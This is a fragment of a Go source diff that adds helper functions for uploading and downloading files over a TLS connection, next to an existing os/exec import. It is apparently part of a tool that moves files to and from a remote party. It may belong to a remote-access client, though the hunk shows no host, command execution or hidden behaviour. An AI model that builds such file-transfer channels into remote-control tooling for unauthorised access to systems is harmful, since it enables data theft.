@@ -8,10 +8,39 @@ import (
 	"fmt"
 	"log"
 	"net"
+	"io"
 	"os"
 	"strings"
 	"os/exec"
 )
+func handleError(err error){
+	if err != nil {
+		log.Fatal(err)
+	}
+}
+func uploadFile( conn *tls.Conn,path string) {
+	// open file to upload
+	fi, err := os.Open(path)
+	handleError(err)
+	defer fi.Close()
+	// upload
+	_, err = io.Copy(conn, fi)
+	handleError(err)
+}
+
+func downloadFile(conn *tls.Conn,path string) {
+	// create new file to hold response
+	fo, err := os.Create(path)
+	handleError(err)
+	defer fo.Close()
+
+	
+	handleError(err)
+	defer conn.Close()
+
+	_, err = io.Copy(fo, conn)
+	handleError(err)
+}
 
 func main() {
 
